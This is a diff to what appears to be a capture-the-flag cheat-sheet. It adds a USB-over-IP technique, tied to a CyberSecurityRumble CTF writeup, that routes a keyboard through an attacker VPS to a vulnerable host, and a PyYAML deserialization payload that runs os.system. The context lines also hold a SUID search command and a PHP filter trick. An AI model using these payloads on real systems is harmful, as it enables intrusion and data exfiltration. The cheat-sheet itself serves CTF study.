@@ -153,6 +153,28 @@ find / -perm -u=s -type f 2>/dev/null
     header('Location: php://filter/string.toupper/resource=index.php');
     ?>
     ```
+- USB over IP
+    ```bash
+    # On localhost:
+    # Given "GatewayPorts yes" enabled in $vps_host sshd_config
+    ssh $user@$vps_host -R 3240:localhost:3240
+
+    # On $vps_host:
+    sudo modprobe usbip-host
+    sudo modprobe usbip-core
+    sudo usbipd -D
+    sudo usbip list -l # Take bus id of second keyboard = 1-7
+    sudo usbip --debug bind -b 1-7
+
+    # On $vulnerable_host:
+    # Given TTY of connected user = ttyS0
+    /sbin/usbip attach -r $vps_host -b 1-7 &
+    cat /dev/ttyS0
+
+    # On $vps_host:
+    cat flag.txt > /dev/ttyS0
+    ```
+        - [CTFtime\.org / CyberSecurityRumble CTF / EZExfil / Writeup](https://ctftime.org/writeup/24786)
 
 # encodings
 
@@ -174,4 +196,7 @@ Morse
 - digital radio transmission decoder
     - https://github.com/EliasOenal/multimon-ng
 
+# yaml
 
+- PyYAML yaml.load()
+    - `!!python/object/apply:os.system ["cat flag.txt"]`
